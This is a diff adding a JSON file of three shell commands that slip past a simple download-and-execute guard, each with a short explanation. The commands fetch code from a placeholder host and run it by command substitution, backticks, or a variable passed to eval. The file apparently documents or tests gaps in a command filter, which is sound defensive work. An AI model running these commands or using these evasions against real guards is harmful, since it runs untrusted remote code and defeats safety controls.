@@ -1,0 +1,17 @@
+[
+  {
+    "label": "nested in command substitution",
+    "command": "sh -c \"$(curl -s http://x.invalid/i)\"",
+    "why": "The example guard tokenizes only the TOP-LEVEL command. Here the downloader lives inside $(...), so it never appears as a top-level token and the shell that runs is `sh -c` (which reads its script from an argument, not a pipe). A real guard closes this with a quote-aware parser that recurses into every executable context."
+  },
+  {
+    "label": "nested in backticks",
+    "command": "bash -c \"`wget -qO- http://x.invalid/i`\"",
+    "why": "Same class, backtick spelling: the fetch is inside a command substitution and `bash -c` takes its script as an argument, so the top-level token scan sees neither a piped downloader nor a stdin-reading shell."
+  },
+  {
+    "label": "two-step via variable",
+    "command": "X=$(curl -s http://x.invalid/i); eval \"$X\"",
+    "why": "Fetch and execution are two separate statements joined by a variable, with no pipe between them. Catching this needs cross-statement taint tracking, which trades false positives for coverage — a deliberate design call, not an oversight."
+  }
+]
